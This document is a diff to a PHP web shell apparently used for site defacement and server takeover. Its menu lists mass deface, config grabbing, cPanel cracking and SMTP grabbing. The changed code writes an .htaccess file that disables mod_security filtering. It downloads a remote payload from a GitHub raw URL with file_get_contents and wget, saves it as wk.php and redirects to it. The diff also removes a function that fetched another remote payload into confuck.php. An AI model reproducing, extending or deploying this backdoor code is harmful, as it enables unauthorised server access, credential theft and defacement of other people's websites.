@@ -358,7 +358,7 @@ if (!file_exists('php.ini')) {
 }
 if (!file_exists('.htaccess')) {
   $ht = fopen('.htaccess', 'w');
-  $isian = "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>";
+  $isian = "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\nSecRuleEngine Off</IfModule>";
   fwrite($ht, $isian);
   fclose($ht);
 }
@@ -650,8 +650,7 @@ ___  ___         ______                 _              _
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=command'>Command</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=mass_deface'>Mass Deface</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=xaivhost'>Vhost Config Grabber</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=configv2'>Config v2</a>";
-  echo "<a style='border:1px groove cyan;' href='?fuck=config'>Config Fucker</a>";
+  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=configv2'>Config Grabber</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=jumping'>Jumping</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=cpcrack'>CPanel Crack</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=smtp'>SMTP Grabber</a>";
@@ -733,22 +732,12 @@ ___  ___         ______                 _              _
     if ($_POST['conf']) {
       $configuration = $_POST['azztssns'];
       file_put_contents("configuration.php", $configuration, FILE_APPEND);
-      $scr = file_get_contents("http://pastebin.com/raw/31kP3Dp8");
+      $scr = file_get_contents("https://raw.githubusercontent.com/mrxbarakuda/paste/refs/heads/main/whmcskill.txt"); // http://pastebin.com/raw/31kP3Dp8
       $fel = fopen("wk.php", "w");
       fwrite($fel, $scr);
-      exe('wget -O wk.php http://pastebin.com/raw/31kP3Dp8');
+      exe('wget -O wk.php https://raw.githubusercontent.com/mrxbarakuda/paste/refs/heads/main/whmcskill.txt');
       echo '<meta http-equiv="refresh" content="0; url=wk.php">';
     }
-  }
-  function inject($pastebin, $nama_file) {
-    $usa = file_get_contents($pastebin);
-    $frr = fopen($nama_file, 'w');
-    fwrite($frr, $usa);
-  }
-  $fuck = @$_GET['fuck'];
-  if ($fuck == "config") {
-    inject("https://pst.innomi.net/paste/34exmejxmuzehq8vo7wwtozx/raw", "confuck.php");
-    echo '<center><a href="confuck.php" target="_blank"><font color="lime">> CONFIG FUCKER <</a></font></center>';
   } elseif ($_GET['do'] == 'upload') {
     echo "<center>";
     if ($_POST['upload']) {
